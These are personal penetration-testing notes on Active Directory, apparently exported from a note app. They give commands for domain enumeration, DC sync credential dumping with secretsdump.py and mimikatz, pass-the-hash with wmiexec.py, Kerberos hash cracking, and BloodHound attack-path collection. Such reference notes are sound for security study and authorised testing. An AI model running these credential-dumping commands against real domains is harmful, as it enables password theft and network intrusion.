# Active Directoy

> Active Directory is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management.   

## Related

* [TCP 88: Kerberos](bear://x-callback-url/open-note?id=737CB967-22F6-401E-9BEC-5D28FA7350F1-483-00001AB8DF3B4F91)
* [TCP 389: LDAP](bear://x-callback-url/open-note?id=21D3D852-FB60-4125-BA88-A3E7637264CD-622-00000420E636375E)
* [Impacket](bear://x-callback-url/open-note?id=8B82F3FA-7934-4517-98E9-ED74DD9C76EB-524-000018D307D11453)

## General

display permissions using **PowerShell**
```bash
dsacls "DC=<domain>,DC=<domain>"
```

### net

List local accounts
```bash
net user
```

List domain accounts
```bash
net user /domain
```

Details about specific user
```bash
net user <user> /domain
```

List domain groups
```bash
net group /domain
```

Show domain's account policy
```bash
net accounts
```

## DC sync attack

[DC Sync Attacks With Secretsdump.py - YouTube](https://youtu.be/QfyZQDyeXjQ)

```bash
secretsdump.py <domain>/<user>:<pw>@<ip>
```

```bash
wmiexec.py <domain>/<user>@<ip> -hashes "<hash>"
```

**Alternative approach** (probably gets flagged by AV)
Copy & execute `mimikatz.exe` on DC
```bash
lsadump::dcsync
```

## Pre-Auth attack

[Getting Passwords When Kerberos Pre-Auth IS Enabled - YouTube](https://www.youtube.com/watch?v=VLA7x81i5Pw)
	1. sniff KRB auth packet
	2. crack using hashcat

-> If no pre auth is required, just use [Impacket](bear://x-callback-url/open-note?id=8B82F3FA-7934-4517-98E9-ED74DD9C76EB-524-000018D307D11453) to pull hashes from AD.

## BloodHound

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment.
[GitHub - BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

### Gather information (on target)

```bash
.\SharpHound.exe -c all -d <domain> --domain-controller <dc-ip>
```
Copy generated `*BloodHound.zip`

**Alternate approach**
```bash
SharpHound.ps1
Invoke-BloodHound -Domain <domain> -LDAPUser <user> -LDAPPass <pass> -CollectionMethod All -DomainController <dc-ip>
```

### Analyze data (on kali)

```bash
neo4j console
bloodhound
```

connect to database
```bash
bolt://localhost:7687
neo4j
<PW>
```

Import data
`Upload Data` select `.csv`, `.json` or `.zip` file(s)
